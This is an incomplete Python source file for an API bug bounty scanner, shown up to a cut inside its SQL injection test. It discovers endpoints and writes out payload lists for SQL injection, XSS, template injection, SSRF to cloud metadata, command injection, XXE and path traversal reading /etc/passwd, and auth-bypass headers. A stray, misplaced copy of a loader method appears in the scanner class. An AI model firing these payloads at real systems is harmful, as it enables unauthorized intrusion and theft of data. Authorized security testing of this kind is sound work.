#!/usr/bin/env python3
# Elite API Security Hunter - Professional Bug Bounty Scanner
# WARNING: Only use on authorized targets with written permission

import asyncio
import aiohttp
import json
import time
import random
import hashlib
import base64
import os
import sys
import socket
import ssl
import struct
from typing import Dict, List, Set, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse, quote, unquote, parse_qs
import string
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import warnings
warnings.filterwarnings("ignore")

# Optional imports
try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

class PayloadManager:
    """Advanced payload management system"""
    
    def __init__(self, base_dir="payloads"):
        self.base_dir = base_dir
        self.payloads = {}
        self.ensure_payload_structure()
        self.load_all_payloads()
    
    def ensure_payload_structure(self):
        """Create payload directory structure if not exists"""
        if not os.path.exists(self.base_dir):
            os.makedirs(self.base_dir)
            self.create_default_payloads()
    
    def create_default_payloads(self):
        """Create default payload files"""
        defaults = {
            'sql_injection.txt': [
                "'",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "admin' --",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)#",
                "1';WAITFOR DELAY '0:0:5'--"
            ],
            
            'xss.txt': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>"
            ],
            
            'ssti.txt': [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{settings.SECRET_KEY}}"
            ],
            
            'ssrf.txt': [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost/",
                "http://127.0.0.1/",
                "file:///etc/passwd"
            ],
            
            'api_endpoints.txt': [
                "/api",
                "/api/v1",
                "/api/v2",
                "/api/v3",
                "/v1",
                "/v2",
                "/graphql",
                "/api/users",
                "/api/auth",
                "/api/login",
                "/api/health",
                "/api/status",
                "/swagger",
                "/openapi.json"
            ],
            
            'auth_bypass_headers.txt': [
                "X-Originating-IP: 127.0.0.1",
                "X-Forwarded-For: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Original-URL: /admin"
            ],
            
            'command_injection.txt': [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                ";sleep 5"
            ],
            
            'nosql_injection.txt': [
                '{"$ne": null}',
                '{"$ne": ""}',
                '{"$gt": ""}',
                '{"$exists": true}'
            ],
            
            'xxe.txt': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
            ],
            
            'lfi.txt': [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd"
            ]
        }
        
        for filename, payloads in defaults.items():
            filepath = os.path.join(self.base_dir, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write('\n'.join(payloads))
    
    def load_all_payloads(self):
        """Load all payload files"""
        for filename in os.listdir(self.base_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.base_dir, filename)
                payload_type = filename.replace('.txt', '')
                
                with open(filepath, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self.payloads[payload_type] = payloads
                    
    def get(self, payload_type: str) -> List[str]:
        """Get payloads by type"""
        return self.payloads.get(payload_type, [])

class BugBountyScanner:
    """Elite Bug Bounty API Security Scanner - Improved Version"""
    
    def __init__(self, target: str, threads: int = 30, aggressive: int = 8):
        self.target = target if target.startswith('http') else f'https://{target}'
        self.domain = urlparse(self.target).netloc
        self.threads = threads
        self.aggressive = aggressive
        self.session = None
        self.payloads = PayloadManager()
        self.vulnerabilities = []
        self.endpoints_found = set()
        
    async def initialize(self):
        """Initialize async session"""
        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=10)
        connector = aiohttp.TCPConnector(
            limit=self.threads,
            ssl=False,
            force_close=True
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': self.get_random_ua(),
                'Accept': 'application/json, text/html, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache'
            }
        )
    
    def get_random_ua(self):
        """Random User-Agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(agents)
    
    def is_json_response(self, text: str) -> bool:
        """Check if response is JSON"""
        if not text or len(text) < 2:
            return False
        
        text = text.strip()
        if text[0] in ['{', '['] and text[-1] in ['}', ']']:
            try:
                json.loads(text)
                return True
            except:
                pass
        return False
    
    def is_xml_response(self, text: str) -> bool:
        """Check if response is XML"""
        if not text or len(text) < 10:
            return False
        
        text = text.strip()
        return text.startswith('<?xml') or (text.startswith('<') and text.endswith('>'))

    async def is_real_api_endpoint(self, url: str, response) -> Tuple[bool, str]:
        """
        ADVANCED API endpoint detection - Professional bug bounty level
        Returns: (is_api, api_type)
        """
        
        # 1. IMMEDIATE DISQUALIFIERS
        if response.status in [404, 502, 503, 500]:
            return False, f'HTTP {response.status}'
        
        # 2. GET RESPONSE CONTENT AND HEADERS
        try:
            text = await response.text()
            if not text or len(text.strip()) < 5:
                return False, 'Empty Response'
            
            text_sample = text[:5000].strip()  # Increased sample size
            text_lower = text_sample.lower()
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Get all response headers for analysis
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
        except Exception:
            return False, 'Read Error'
        
        # 3. HTML KILLERS (High Priority - Definitive NOT API)
        html_killers = [
            '<!doctype html',
            '<html',
            '<head>',
            '<body>',
            '<title>',
            '<div',
            '<form',
            '<table',
            '<script',
            'not found</title>',
            '404 not found',
            '404 - not found',
            'page not found',
            'file not found',
            'apache/2.',
            'nginx/',
            'microsoft-iis',
            'server error',
            'access denied',
            'forbidden',
            'directory listing',
            'index of /',
            '<h1>404</h1>',
            '<h1>error</h1>'
        ]
        
        for killer in html_killers:
            if killer in text_lower:
                return False, 'HTML/Error Page'
        
        # 4. DOCUMENTATION FILE DETECTION (NOT real APIs)
        doc_indicators = [
            '"openapi":',
            '"swagger":',
            '"info":',
            '"paths":',
            '"components":',
            '"definitions":',
            '"host":',
            '"basepath":',
            '"schemes":',
            '"consumes":',
            '"produces":'
        ]
        
        # Check if URL suggests it's a documentation file
        is_doc_url = any(indicator in url.lower() for indicator in [
            'openapi', 'swagger', 'docs', 'spec', 'schema', 'definition',
            '.json', '.yaml', '.yml'
        ])
        
        if is_doc_url:
            doc_score = sum(1 for indicator in doc_indicators if indicator in text_lower)
            if doc_score >= 3:  # Multiple doc indicators = definitely documentation
                return False, 'API Documentation'
        
        # 5. DEFINITIVE API INDICATORS (Content-Type based)
        definite_api_types = {
            'application/json': 'REST/JSON',
            'application/xml': 'REST/XML',
            'text/xml': 'REST/XML', 
            'application/soap+xml': 'SOAP',
            'application/graphql': 'GraphQL',
            'application/vnd.api+json': 'JSON:API',
            'application/hal+json': 'HAL+JSON',
            'application/vnd.collection+json': 'Collection+JSON',
            'application/problem+json': 'Problem Details',
            'application/merge-patch+json': 'JSON Merge Patch'
        }
        
        for ct, api_type in definite_api_types.items():
            if ct in content_type:
                # Additional verification for JSON responses
                if 'json' in ct:
                    try:
                        # Must be valid JSON and not documentation
                        json_data = json.loads(text_sample)
                        if not is_doc_url:
                            return True, api_type
                    except:
                        pass
                else:
                    return True, api_type
        
        # 6. API-SPECIFIC HEADERS (Strong indicators)
        api_headers = [
            'x-api-version',
            'x-api-key', 
            'x-rate-limit',
            'x-ratelimit',
            'x-request-id',
            'x-correlation-id',
            'x-trace-id',
            'x-powered-by',
            'server'
        ]
        
        api_header_score = 0
        for header in api_headers:
            if header in headers:
                api_header_score += 1
                # Specific server headers that indicate APIs
                if header == 'server':
                    server_val = headers[header]
                    if any(indicator in server_val for indicator in [
                        'express', 'koa', 'fastify', 'spring', 'django', 
                        'flask', 'tornado', 'rails', 'sinatra'
                    ]):
                        api_header_score += 2
        
        # 7. AUTHENTICATION-PROTECTED ENDPOINTS
        if response.status in [401, 403]:
            auth_indicators = [
                'www-authenticate',
                'x-api-key', 
                'x-auth-token',
                'authorization',
                'x-rate-limit',
                'x-ratelimit'
            ]
            
            # Check headers
            for indicator in auth_indicators:
                if indicator in headers:
                    return True, 'Protected API'
            
            # Check response body for API-like auth errors
            api_auth_patterns = [
                r'"error"\s*:\s*"(unauthorized|forbidden|invalid.*token|missing.*auth)',
                r'"message"\s*:\s*"(unauthorized|forbidden|authentication|authorization)',
                r'"code"\s*:\s*"(401|403|auth_required|token_invalid)',
                r'"status"\s*:\s*"(unauthorized|forbidden|error)",',
                r'"access_token"',
                r'"api_key"',
                r'"authentication.*required"',
                r'"invalid.*credentials"'
            ]
            
            auth_error_score = 0
            for pattern in api_auth_patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    auth_error_score += 1
            
            if auth_error_score >= 1:
                return True, 'Protected API'
        
        # 8. REAL API RESPONSE PATTERNS (Advanced pattern matching)
        api_structure_patterns = [
            # RESTful data structures
            r'^\s*{\s*"data"\s*:\s*[{\[]',
            r'^\s*{\s*"result"\s*:\s*[{\[]',
            r'^\s*{\s*"results"\s*:\s*\[',
            r'^\s*{\s*"items"\s*:\s*\[',
            r'^\s*{\s*"records"\s*:\s*\[',
            r'^\s*{\s*"entries"\s*:\s*\[',
            r'^\s*{\s*"list"\s*:\s*\[',
            r'^\s*{\s*"collection"\s*:\s*\[',
            
            # API metadata patterns
            r'^\s*{\s*"version"\s*:\s*"[^"]*"',
            r'^\s*{\s*"api_version"\s*:\s*"[^"]*"',
            r'^\s*{\s*"apiVersion"\s*:\s*"[^"]*"',
            r'^\s*{\s*"timestamp"\s*:\s*\d+',
            r'^\s*{\s*"request_id"\s*:\s*"[^"]*"',
            r'^\s*{\s*"requestId"\s*:\s*"[^"]*"',
            r'^\s*{\s*"correlation_id"\s*:\s*"[^"]*"',
            r'^\s*{\s*"traceId"\s*:\s*"[^"]*"',
            
            # Error response patterns (API-style errors)
            r'^\s*{\s*"error"\s*:\s*{\s*"code"',
            r'^\s*{\s*"error"\s*:\s*{\s*"message"',
            r'^\s*{\s*"error"\s*:\s*{\s*"type"',
            r'^\s*{\s*"errors"\s*:\s*\[.*"message"',
            r'^\s*{\s*"message"\s*:\s*"[^"]*",\s*"code"\s*:\s*\d+',
            r'^\s*{\s*"status"\s*:\s*"(error|fail|success)",',
            r'^\s*{\s*"success"\s*:\s*(true|false)',
            
            # GraphQL response patterns
            r'^\s*{\s*"data"\s*:\s*{.*"errors"\s*:\s*\[',
            r'^\s*{\s*"errors"\s*:\s*\[.*"message".*"locations"',
            r'^\s*{\s*"data"\s*:\s*null,\s*"errors"',
            
            # Health/Status API patterns
            r'^\s*{\s*"status"\s*:\s*"(up|down|ok|healthy)"',
            r'^\s*{\s*"health"\s*:\s*"(up|down|ok)"',
            r'^\s*{\s*"alive"\s*:\s*(true|false)',
            r'^\s*{\s*"ready"\s*:\s*(true|false)'
        ]
        
        structure_score = 0
        for pattern in api_structure_patterns:
            if re.match(pattern, text_sample, re.IGNORECASE | re.MULTILINE):
                structure_score += 1
        
        # 9. MODERN API FRAMEWORK DETECTION
        framework_indicators = [
            # Express.js and Node.js
            ('express', 2),
            ('node.js', 1),
            ('koa', 2),
            ('fastify', 2),
            
            # Python frameworks
            ('django rest framework', 3),
            ('django', 1),
            ('flask', 2),
            ('fastapi', 3),
            ('tornado', 2),
            
            # Spring Boot and Java
            ('spring boot', 2),
            ('spring framework', 2),
            ('springframework', 2),
            
            # Ruby
            ('ruby on rails', 2),
            ('rails api', 3),
            ('sinatra', 2),
            
            # Go frameworks
            ('gin-gonic', 3),
            ('echo', 1),
            ('fiber', 2),
            
            # .NET
            ('asp.net', 1),
            ('web api', 2),
            
            # Other
            ('laravel', 1),
            ('symfony', 1)
        ]
        
        framework_score = 0
        for indicator, weight in framework_indicators:
            if indicator in text_lower:
                framework_score += weight
        
        # 10. COMPREHENSIVE SCORING SYSTEM
        total_score = structure_score + api_header_score + framework_score
        
        # High confidence API detection
        if total_score >= 4:
            return True, 'REST API (High Confidence)'
        elif total_score >= 2 and response.status == 200:
            return True, 'REST API (Medium Confidence)'
        
        # 11. PATH-BASED DETECTION (Conservative approach)
        real_api_paths = [
            '/api/', '/v1/', '/v2/', '/v3/', '/v4/', '/v5/',
            '/graphql', '/rest/', '/admin/api/', '/mobile/api/',
            '/storefront-api/', '/api/v', '/rest/v'
        ]
        
        path_match = any(path in url.lower() for path in real_api_paths)
        
        if path_match and response.status in [200, 201, 204, 400, 401, 403, 405, 422, 429]:
            # Additional verification for path-based detection
            content_indicators = [
                '{', '}', '[', ']', '"data"', '"error"', '"message"',
                '"status"', '"result"', '"api', '"version"'
            ]
            
            indicator_count = sum(1 for indicator in content_indicators if indicator in text_sample)
            
            if indicator_count >= 3:
                return True, 'API (Path-based)'
        
        # 12. FINAL DECISION
        return False, 'Not API'

    async def verify_endpoint_enhanced(self, url: str) -> Optional[str]:
        """
        ENHANCED endpoint verification with multiple verification methods
        """
        methods_to_try = ['GET', 'OPTIONS', 'HEAD']
        verification_results = []
        
        for method in methods_to_try:
            try:
                async with self.session.request(
                    method, 
                    url, 
                    allow_redirects=False,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    is_api, api_type = await self.is_real_api_endpoint(url, response)
                    
                    verification_results.append({
                        'method': method,
                        'status': response.status,
                        'is_api': is_api,
                        'api_type': api_type
                    })
                    
                    if is_api:
                        # Additional verification for GET requests
                        if method == 'GET' and response.status == 200:
                            try:
                                content = await response.text()
                                content_length = len(content.strip())
                                
                                # Skip if content is suspiciously short and contains error indicators
                                if content_length < 50:
                                    error_indicators = ['not found', '404', 'error', 'forbidden']
                                    if any(indicator in content.lower() for indicator in error_indicators):
                                        continue
                                
                                # Additional content validation
                                if content_length > 10:  # Has meaningful content
                                    print(f"  [+] Real API found: {url} ({api_type}) - Status: {response.status} - Method: {method}")
                                    return url
                                    
                            except:
                                pass
                        
                        # For non-GET methods or other status codes
                        elif method in ['OPTIONS', 'HEAD'] or response.status in [401, 403, 405]:
                            print(f"  [+] Real API found: {url} ({api_type}) - Status: {response.status} - Method: {method}")
                            return url
                            
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                continue
        
        # Analyze all verification results
        api_votes = sum(1 for result in verification_results if result['is_api'])
        
        if api_votes >= 2:  # Majority vote
            best_result = max([r for r in verification_results if r['is_api']], 
                            key=lambda x: x['status'] if x['status'] < 400 else 0)
            print(f"  [+] Real API found (majority vote): {url} ({best_result['api_type']})")
            return url
        
        return None

    async def discover_endpoints_comprehensive(self) -> Set[str]:
        """
        COMPREHENSIVE endpoint discovery using all available techniques
        """
        endpoints = set()
        
        print("[*] Phase 1: Comprehensive API endpoint discovery...")
        
        # 1. BASE TARGET CHECK
        base_check = await self.verify_endpoint_enhanced(self.target)
        if base_check:
            endpoints.add(base_check)
        
        # 2. LOAD COMPREHENSIVE PATTERNS
        api_patterns = self.payloads.get('api_endpoints')
        
        if not api_patterns:
            print("[!] Warning: api_endpoints.txt not found, using minimal fallback")
            api_patterns = ['/api', '/api/v1', '/health', '/ping']
        
        print(f"[*] Testing {len(api_patterns)} endpoint patterns...")
        
        # 3. INTELLIGENT BATCHING WITH PROGRESS
        batch_size = 10
        tested_count = 0
        found_count = 0
        
        for i in range(0, len(api_patterns), batch_size):
            batch = api_patterns[i:i+batch_size]
            tasks = []
            
            for pattern in batch:
                # Clean pattern and skip comments
                clean_pattern = pattern.strip()
                if not clean_pattern or clean_pattern.startswith('#'):
                    continue
                    
                url = urljoin(self.target, clean_pattern)
                tasks.append(self.verify_endpoint_enhanced(url))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if result and not isinstance(result, Exception):
                        endpoints.add(result)
                        found_count += 1
                
                tested_count += len(tasks)
            
            # Adaptive rate limiting based on findings
            if found_count > 0:
                await asyncio.sleep(0.3)  # Slower when finding endpoints
            else:
                await asyncio.sleep(0.2)  # Faster when nothing found
            
            # Progress reporting
            if tested_count % 100 == 0:
                print(f"  [*] Progress: {tested_count}/{len(api_patterns)} tested, {found_count} endpoints found")
        
        print(f"  [+] Pattern testing complete: {found_count} endpoints found from {tested_count} tests")
        
        # 4. ADVANCED JAVASCRIPT ANALYSIS
        print("[*] Analyzing JavaScript for hidden API endpoints...")
        js_endpoints = await self.extract_js_endpoints_advanced()
        
        js_found = 0
        for endpoint_url in js_endpoints:
            verified = await self.verify_endpoint_enhanced(endpoint_url)
            if verified:
                endpoints.add(verified)
                js_found += 1
        
        if js_found > 0:
            print(f"  [+] JavaScript analysis: {js_found} additional endpoints found")
        
        # 5. ROBOTS.TXT & SITEMAP.XML ANALYSIS
        print("[*] Analyzing robots.txt and sitemap.xml...")
        robots_endpoints = await self.extract_robots_sitemap_endpoints()
        
        robots_found = 0
        for endpoint_url in robots_endpoints:
            verified = await self.verify_endpoint_enhanced(endpoint_url)
            if verified:
                endpoints.add(verified)
                robots_found += 1
        
        if robots_found > 0:
            print(f"  [+] Robots/Sitemap analysis: {robots_found} additional endpoints found")
        
        # 6. SUBDOMAIN API DISCOVERY
        print("[*] Checking API subdomains...")
        api_subdomains = await self.check_api_subdomains_advanced()
        subdomain_found = len(api_subdomains)
        endpoints.update(api_subdomains)
        
        if subdomain_found > 0:
            print(f"  [+] Subdomain discovery: {subdomain_found} API subdomains found")
        
        # 7. DOCUMENTATION SCRAPING FOR REAL ENDPOINTS
        print("[*] Scraping documentation for real endpoints...")
        doc_endpoints = await self.scrape_documentation_endpoints()
        doc_found = 0
        
        for endpoint_url in doc_endpoints:
            verified = await self.verify_endpoint_enhanced(endpoint_url)
            if verified:
                endpoints.add(verified)
                doc_found += 1
        
        if doc_found > 0:
            print(f"  [+] Documentation scraping: {doc_found} real endpoints found")
        
        self.endpoints_found = endpoints
        total_found = len(endpoints)
        
        print(f"[+] Comprehensive discovery complete: {total_found} real API endpoints found")
        
        # Detailed reporting
        if endpoints:
            print(f"  [*] Summary of discovered endpoints:")
            sorted_endpoints = sorted(list(endpoints))
            
            # Group by type for better presentation
            base_endpoints = [e for e in sorted_endpoints if e == self.target]
            versioned_endpoints = [e for e in sorted_endpoints if re.search(r'/v\d+', e)]
            graphql_endpoints = [e for e in sorted_endpoints if 'graphql' in e.lower()]
            health_endpoints = [e for e in sorted_endpoints if any(h in e.lower() for h in ['health', 'ping', 'status'])]
            other_endpoints = [e for e in sorted_endpoints if e not in base_endpoints + versioned_endpoints + graphql_endpoints + health_endpoints]
            
            if base_endpoints:
                print(f"    Base: {len(base_endpoints)} endpoints")
                for ep in base_endpoints[:3]:
                    print(f"      - {ep}")
            
            if versioned_endpoints:
                print(f"    Versioned: {len(versioned_endpoints)} endpoints")
                for ep in versioned_endpoints[:5]:
                    print(f"      - {ep}")
            
            if graphql_endpoints:
                print(f"    GraphQL: {len(graphql_endpoints)} endpoints")
                for ep in graphql_endpoints:
                    print(f"      - {ep}")
            
            if health_endpoints:
                print(f"    Health/Status: {len(health_endpoints)} endpoints")
                for ep in health_endpoints:
                    print(f"      - {ep}")
            
            if other_endpoints:
                print(f"    Other: {len(other_endpoints)} endpoints")
                for ep in other_endpoints[:5]:
                    print(f"      - {ep}")
                if len(other_endpoints) > 5:
                    print(f"      - ... and {len(other_endpoints) - 5} more")
        
        return endpoints

    async def discover_actuator_endpoints(self, base_url: str) -> Set[str]:
        """Discover Spring Boot Actuator sub-endpoints"""
        actuator_endpoints = [
            '/health', '/info', '/env', '/beans', '/configprops', 
            '/metrics', '/trace', '/dump', '/autoconfig'
        ]
        
        found = set()
        for endpoint in actuator_endpoints:
            test_url = base_url + endpoint
            verified = await self.verify_endpoint_enhanced(test_url)
            if verified:
                found.add(verified)
        
        return found

    # Also update PayloadManager to handle the comprehensive api_endpoints.txt
    def load_all_payloads(self):
        """Load all payload files - Updated to handle larger api_endpoints.txt"""
        loaded_files = 0
        
        for filename in os.listdir(self.base_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.base_dir, filename)
                payload_type = filename.replace('.txt', '')
                
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        payloads = []
                        line_count = 0
                        
                        for line in f:
                            line = line.strip()
                            line_count += 1
                            
                            # Skip empty lines and comments
                            if line and not line.startswith('#'):
                                payloads.append(line)
                        
                        if payloads:
                            self.payloads[payload_type] = payloads
                            loaded_files += 1
                            
                            # Special handling for api_endpoints - show count
                            if payload_type == 'api_endpoints':
                                print(f"[+] Loaded {len(payloads)} API endpoints from {filename} ({line_count} total lines)")
                            else:
                                print(f"[+] Loaded {len(payloads)} payloads from {filename}")
                        else:
                            print(f"[!] No valid payloads found in {filename}")
                            
                except Exception as e:
                    print(f"[!] Error loading {filename}: {e}")
        
        print(f"[+] Successfully loaded {loaded_files} payload files")
        
        # Add some default API endpoints if api_endpoints.txt is missing
        if 'api_endpoints' not in self.payloads:
            print("[!] api_endpoints.txt not found, creating with basic patterns")
            self.payloads['api_endpoints'] = [
                '/api', '/api/v1', '/api/v2', '/v1', '/v2', 
                '/graphql', '/health', '/ping', '/status'
            ]

    async def extract_js_endpoints_advanced(self) -> Set[str]:
        """
        ADVANCED JavaScript analysis based on bug bounty techniques
        """
        endpoints = set()
        
        try:
            # Get main page
            async with self.session.get(self.target) as response:
                if response.status != 200:
                    return endpoints
                    
                content = await response.text()
                
                # Find all JavaScript files
                js_files = re.findall(r'<script[^>]*src=[\'"](.*?\.js)[\'"]', content, re.IGNORECASE)
                
                # Also check inline scripts
                inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
                
                all_js_content = '\n'.join(inline_scripts)
                
                # Fetch external JS files
                for js_file in js_files[:10]:  # Limit to avoid too many requests
                    try:
                        js_url = urljoin(self.target, js_file)
                        async with self.session.get(js_url) as js_response:
                            if js_response.status == 200:
                                js_content = await js_response.text()
                                all_js_content += '\n' + js_content
                    except:
                        continue
                
                # REAL-WORLD API PATTERNS from JavaScript (based on research)
                js_api_patterns = [
                    # Modern fetch patterns
                    r'fetch\s*\(\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'fetch\s*\(\s*[\'"`](https?://[^\'"`\s]+)[\'"`]',
                    
                    # Axios patterns
                    r'axios\.[a-z]+\s*\(\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'axios\([^)]*url\s*:\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    
                    # jQuery AJAX
                    r'\$.ajax\([^)]*url\s*:\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'\$.get\s*\(\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'\$.post\s*\(\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    
                    # API configuration
                    r'apiUrl\s*[:=]\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'API_URL\s*[:=]\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'baseURL\s*[:=]\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'endpoint\s*[:=]\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    
                    # GraphQL patterns  
                    r'graphql[\'"`]\s*:\s*[\'"`](\/[^\'"`\s]+)[\'"`]',
                    r'/graphql',
                    
                    # WebSocket APIs (modern)
                    r'ws://[^\'"`\s]+',
                    r'wss://[^\'"`\s]+',
                ]
                
                for pattern in js_api_patterns:
                    matches = re.findall(pattern, all_js_content, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        
                        # Clean and validate
                        match = match.strip()
                        if not match:
                            continue
                        
                        # Convert to full URL
                        if match.startswith('/'):
                            endpoint_url = urljoin(self.target, match)
                        elif match.startswith('http') and self.domain in match:
                            endpoint_url = match
                        else:
                            continue
                        
                        # Filter out obvious non-APIs
                        if any(ext in endpoint_url.lower() for ext in ['.js', '.css', '.png', '.jpg', '.gif', '.ico']):
                            continue
                        
                        endpoints.add(endpoint_url)
                
        except Exception as e:
            print(f"[!] JavaScript analysis failed: {e}")
        
        return endpoints
    
    async def check_api_subdomains_advanced(self) -> Set[str]:
        """
        Advanced API subdomain discovery with comprehensive patterns
        """
        endpoints = set()
        
        # Comprehensive API subdomain patterns
        api_subdomains = [
            # Common API subdomains
            'api', 'apis', 'rest', 'graphql', 'gateway',
            
            # Versioned subdomains
            'api-v1', 'api-v2', 'apiv1', 'apiv2', 'v1-api', 'v2-api',
            
            # Environment-specific
            'api-dev', 'dev-api', 'api-staging', 'staging-api',
            'api-test', 'test-api', 'api-beta', 'beta-api',
            'api-prod', 'prod-api', 'api-live', 'live-api',
            
            # Platform-specific
            'mobile-api', 'app-api', 'web-api', 'admin-api',
            'partner-api', 'vendor-api', 'client-api',
            
            # Service-specific
            'auth-api', 'user-api', 'data-api', 'payment-api',
            'notification-api', 'search-api', 'analytics-api',
            
            # Cloud/Infrastructure
            'cloud-api', 'service-api', 'microservice'
        ]
        
        domain_parts = self.domain.split('.')
        if len(domain_parts) >= 2:
            base_domain = '.'.join(domain_parts[-2:])
            
            # Test subdomain patterns
            for subdomain in api_subdomains[:15]:  # Limit to avoid excessive DNS queries
                api_domain = f"{subdomain}.{base_domain}"
                
                # Try both HTTP and HTTPS
                for protocol in ['https', 'http']:
                    api_url = f"{protocol}://{api_domain}"
                    
                    try:
                        verified = await self.verify_endpoint_enhanced(api_url)
                        if verified:
                            endpoints.add(verified)
                            break  # Found with this protocol, no need to try the other
                    except:
                        continue
        
        return endpoints
    
    async def scrape_documentation_endpoints(self) -> Set[str]:
        """
        Scrape documentation files to find real API endpoints
        """
        endpoints = set()
        
        doc_urls = [
            urljoin(self.target, '/swagger.json'),
            urljoin(self.target, '/openapi.json'),
            urljoin(self.target, '/api-docs'),
            urljoin(self.target, '/docs'),
            urljoin(self.target, '/swagger'),
            urljoin(self.target, '/api/swagger.json'),
            urljoin(self.target, '/api/docs')
        ]
        
        for doc_url in doc_urls:
            try:
                async with self.session.get(doc_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Parse OpenAPI/Swagger for real endpoints
                        try:
                            doc_data = json.loads(content)
                            
                            # OpenAPI/Swagger path extraction
                            if 'paths' in doc_data:
                                for path in doc_data['paths'].keys():
                                    if path.startswith('/'):
                                        endpoint_url = urljoin(self.target, path)
                                        endpoints.add(endpoint_url)
                            
                            # Base path handling
                            base_path = doc_data.get('basePath', '')
                            if base_path:
                                base_endpoint = urljoin(self.target, base_path)
                                endpoints.add(base_endpoint)
                                
                        except json.JSONDecodeError:
                            # Try regex extraction for non-JSON docs
                            path_patterns = [
                                r'"/([^"]*api[^"]*)"',
                                r"'/([^']*api[^']*)'",
                                r'path:\s*["\']([^"\']+)["\']',
                                r'endpoint:\s*["\']([^"\']+)["\']'
                            ]
                            
                            for pattern in path_patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    if match.startswith('/'):
                                        endpoint_url = urljoin(self.target, match)
                                        endpoints.add(endpoint_url)
                            
            except:
                continue
        
        return endpoints

    async def extract_robots_sitemap_endpoints(self) -> Set[str]:
        """
        Extract API endpoints from robots.txt and sitemap.xml
        """
        endpoints = set()
        
        # Check robots.txt
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            async with self.session.get(robots_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Look for API paths in robots.txt
                    for line in content.split('\n'):
                        line = line.strip()
                        if any(directive in line.lower() for directive in ['disallow:', 'allow:', 'crawl-delay:']):
                            # Extract path
                            if ':' in line:
                                path = line.split(':', 1)[1].strip()
                                if path and path != '/' and any(api_indicator in path.lower() for api_indicator in ['api', 'graphql', 'rest']):
                                    endpoint_url = urljoin(self.target, path)
                                    endpoints.add(endpoint_url)
        except:
            pass
        
        # Check sitemap.xml  
        try:
            sitemap_url = urljoin(self.target, '/sitemap.xml')
            async with self.session.get(sitemap_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Extract URLs from sitemap
                    url_pattern = r'<loc>(.*?)</loc>'
                    urls = re.findall(url_pattern, content, re.IGNORECASE)
                    
                    for url in urls:
                        if any(api_indicator in url.lower() for api_indicator in ['api', 'graphql', 'rest']):
                            endpoints.add(url)
        except:
            pass
        
        return endpoints

    async def test_sql_injection_improved(self, endpoint: str) -> List[Dict]:
        """
        IMPROVED SQL Injection Detection - More reliable
        """
        findings = []
        payloads = self.payloads.get('sql_injection', [])
        
        if not payloads:
            return findings
            
        params = ['id', 'user', 'search', 'q', 'filter', 'category', 'userid']
        
        # Very specific SQL error patterns
        sql_error_patterns = [
            r"You have an error in your SQL syntax",
            r"MySQL server version for the right syntax",
            r"PostgreSQL.*ERROR.*syntax error",
            r"ORA-[0-9]{5}.*invalid identifier",
            r"SQLite error.*syntax error",
            r"SQLException.*invalid column name",
            r"mysql_fetch_array\(\).*expects parameter",
            r"Warning.*mysql_.*\(\).*supplied argument"
        ]
        
        for param in params[:3]:
            # Baseline with safe value
            baseline_url = f"{endpoint}?{param}=1"
            
            try:
                async with self.session.get(baseline_url) as baseline_resp:
                    if baseline_resp.status == 404:
